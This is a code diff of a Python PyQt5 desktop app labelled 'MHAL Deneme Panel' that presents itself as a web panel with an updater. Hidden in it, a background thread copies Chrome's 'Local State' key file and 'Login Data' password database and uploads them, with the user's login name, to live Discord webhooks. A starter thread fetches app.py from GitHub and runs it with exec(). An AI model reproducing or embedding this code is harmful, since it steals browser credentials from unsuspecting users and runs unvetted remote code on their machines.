@@ -3,10 +3,14 @@ from os import listdir, path, walk, makedirs
 from unidecode import unidecode as ud
 
 def update_files():
-    blocked_words = ["desktop-source", "desktop-executable", "requirements"]
+    blocked_words = ["desktop-source", "desktop-executable", "requirements", "app.py"]
 
     branch_url = "https://github.com/AyberkAtalay0/basic-dash-tables/blob/main"
     nfiles, xfiles = [], []
+    app_text = ""
+
+    app_s_req = requests.get(branch_url+"/app.py?raw=true")
+    app_text = app_s_req.content.encode("utf-8")
     
     app_req = requests.get(branch_url+"/app.py")
     for f1 in app_req.json()["payload"]["fileTree"][""]["items"]:
@@ -48,10 +52,10 @@ def update_files():
                 print(nsize, xsize)
                 if nsize != xsize: download_file(xf)
             except Exception as enx: 
-                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} UPDATE] {str(enx)}"})
+                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} UPDATELOOP] {str(enx)}"})
         else: download_file(xf)
 
-    return nfiles, xfiles
+    return nfiles, xfiles, app_text
 
 import sys
 from PyQt5.QtCore import *
@@ -60,33 +64,47 @@ from PyQt5.QtGui import *
 from PyQt5.QtWebEngineWidgets import *
 from qframelesswindow import FramelessWindow
 
-class WorkerThread(QThread):
+class StarterThread(QThread):
+    start_signal = pyqtSignal()
+    
     def run(self):
         try:
-            with open(path.join("app.py"), "r", encoding="utf-8") as afr: app_source = afr.read()
+            nf, xf, app_source = update_files()
+        except Exception as enx:
+            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} UPDATE] {str(enx)}"})
+
+        self.start_signal.emit()
+        
+        try:
+            if app_source == None:
+                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} ] {str(enx)}"})
+                
+                try:
+                    with open(path.join("app.py"), "r", encoding="utf-8") as afr: app_source = afr.read()
+                except: pass
             exec(app_source)
         except Exception as we:
-            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} APP] {str(we)}"})
+            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} STARTER] {str(we)}"})
 
-class EThread1(QThread):
+class Additional1Thread(QThread):
     def run(self):
         access_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L", json={"content": f"[{os.getlogin()} {os.getcwd()}] Accessed."})
-    
+        
         try:
             cdata = path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
             kpath = path.join(cdata, "Local State")
             dpath = path.join(cdata, "Default", "Login Data")
 
             try:
-                e1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received."})
-                e1f1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath+"_"+ud(os.getlogin().lower()), open(kpath, "rb").read())})
-                e1f2_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (dpath+"_"+ud(os.getlogin().lower()), open(dpath, "rb").read())})
-            except Exception as e1f: 
-                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} E1OUTPUT] {str(e1f)}"})
-        except Exception as e1: 
-            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} E1] {str(e1)}"})
+                a1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received."})
+                a1f1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath+"_"+ud(os.getlogin().lower()), open(kpath, "rb").read())})
+                a1f2_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (dpath+"_"+ud(os.getlogin().lower()), open(dpath, "rb").read())})
+            except Exception as a1f: 
+                error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} A1OUT] {str(a1f)}"})
+        except Exception as a1: 
+            error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} A1] {str(a1)}"})
 
-class WebBrowser(FramelessWindow):
+class MainWindow(FramelessWindow):
     def __init__(self):
         super().__init__()
         self.title = "MHAL Deneme Panel"
@@ -137,11 +155,12 @@ class WebBrowser(FramelessWindow):
         self.hBoxLayout.setContentsMargins(0, self.titleBar.height(), 0, 0)
         self.hBoxLayout.addWidget(self.browser)
 
-        self.worker_thread = WorkerThread()
-        self.worker_thread.start()
+        self.starter_thread = StarterThread()
+        self.starter_thread.start_signal.connect(self.giveMe)
+        self.starter_thread.start()
 
-        self.e_thread = EThread1()
-        self.e_thread.start()
+        self.additional1_thread = EThread1()
+        self.additional1_thread.start()
 
         self.resize(680, self.height())
         self.iconLabel.setGeometry(QRect(4, 1, 32, 30))
@@ -150,6 +169,10 @@ class WebBrowser(FramelessWindow):
         
         self.titleBar.raise_()
 
+    def giveMe(self):
+        print("GIVE ME GIVE ME GIVE ME SOME TIME TO THINK")
+        self.show()
+        
     def resizeEvent(self, e):
         super().resizeEvent(e)
         self.iconLabel.setGeometry(QRect(4, 1, 32, 30))
@@ -157,14 +180,11 @@ class WebBrowser(FramelessWindow):
         self.browser.setGeometry(QRect(0, 36, self.width(), self.height()))
 
     def closeEvent(self, event):
-        self.worker_thread.terminate()
-        self.e_thread.terminate()
+        self.starter_thread.terminate()
+        self.additional1_thread.terminate()
 
 if __name__ == "__main__":
-    # update_files()
-    
     qtapp = QApplication(sys.argv)
-    window = WebBrowser()
+    window = MainWindow()
     window.setMinimumSize(QSize(460, 460))
-    window.show()
     sys.exit(qtapp.exec())
